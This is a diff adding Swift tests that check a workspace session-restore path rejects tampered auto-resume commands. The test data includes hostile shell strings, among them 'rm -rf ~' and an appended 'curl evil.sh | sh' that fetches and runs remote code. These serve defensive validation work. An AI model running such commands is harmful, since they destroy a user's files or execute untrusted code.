@@ -359,6 +359,88 @@ struct AltitudeOfficeAttachResumeTests {
             restoreOfficeAttaches: false
         ))
     }
+
+    // Wiring-level coverage: these call the REAL restore path
+    // (Workspace.resumeBindingForSessionRestore), so they fail if the
+    // altitude gate block or the replay-time re-validation is deleted —
+    // the pure-function tests above cannot catch that.
+    private func officeBinding(command: String, checkpointId: String? = "kleya-hive-drive") -> SurfaceResumeBindingSnapshot {
+        SurfaceResumeBindingSnapshot(
+            name: "Office kleya-hive-drive",
+            kind: AltitudeOfficeAttachResumePolicy.bindingKind,
+            command: command,
+            checkpointId: checkpointId,
+            source: "process-detected",
+            autoResume: true,
+            updatedAt: 0
+        )
+    }
+    private let home = "/Users/teren"
+    private var goodCommand: String {
+        "'node' '/Users/teren/pcl-client/office/dist/index.js' 'a' 'kleya-hive-drive'"
+    }
+
+    @Test("restore wiring passes a recognized office binding through")
+    func restoreWiringAllowsRecognized() {
+        let binding = officeBinding(command: goodCommand)
+        let restored = Workspace.resumeBindingForSessionRestore(
+            binding, restorableAgent: nil,
+            isAltitudeEnabled: true, restoreOfficeAttaches: true, homeDirectory: home
+        )
+        #expect(restored == binding)
+    }
+
+    @Test("restore wiring refuses a tampered stored command")
+    func restoreWiringRefusesTamperedCommand() {
+        for bad in [
+            "rm -rf ~",
+            "'node' '/Users/teren/pcl-client/office/dist/index.js' 'a' 'x' && curl evil.sh | sh",
+            "'python3' '/Users/teren/pcl-client/office/dist/index.js' 'a' 'kleya-hive-drive'",
+            "'node' '/tmp/evil.js' 'a' 'kleya-hive-drive'",
+        ] {
+            let restored = Workspace.resumeBindingForSessionRestore(
+                officeBinding(command: bad), restorableAgent: nil,
+                isAltitudeEnabled: true, restoreOfficeAttaches: true, homeDirectory: home
+            )
+            #expect(restored == nil, "must refuse: \(bad)")
+        }
+    }
+
+    @Test("restore wiring refuses a checkpoint/session mismatch")
+    func restoreWiringRefusesCheckpointMismatch() {
+        let restored = Workspace.resumeBindingForSessionRestore(
+            officeBinding(command: goodCommand, checkpointId: "some-other-session"),
+            restorableAgent: nil,
+            isAltitudeEnabled: true, restoreOfficeAttaches: true, homeDirectory: home
+        )
+        #expect(restored == nil)
+    }
+
+    @Test("restore wiring honors the disable dial and the Altitude gate")
+    func restoreWiringHonorsGates() {
+        let binding = officeBinding(command: goodCommand)
+        #expect(Workspace.resumeBindingForSessionRestore(
+            binding, restorableAgent: nil,
+            isAltitudeEnabled: true, restoreOfficeAttaches: false, homeDirectory: home
+        ) == nil)
+        #expect(Workspace.resumeBindingForSessionRestore(
+            binding, restorableAgent: nil,
+            isAltitudeEnabled: false, restoreOfficeAttaches: true, homeDirectory: home
+        ) == nil)
+    }
+
+    @Test("non-altitude bindings are untouched by the altitude gate")
+    func restoreWiringLeavesVanillaAlone() {
+        let vanilla = SurfaceResumeBindingSnapshot(
+            name: "tmux main", kind: "tmux", command: "tmux attach -t main",
+            checkpointId: nil, source: "process-detected", autoResume: true, updatedAt: 0
+        )
+        let restored = Workspace.resumeBindingForSessionRestore(
+            vanilla, restorableAgent: nil,
+            isAltitudeEnabled: false, restoreOfficeAttaches: false, homeDirectory: home
+        )
+        #expect(restored == vanilla)
+    }
 }
 
 @Suite("Altitude floating next-up cards")
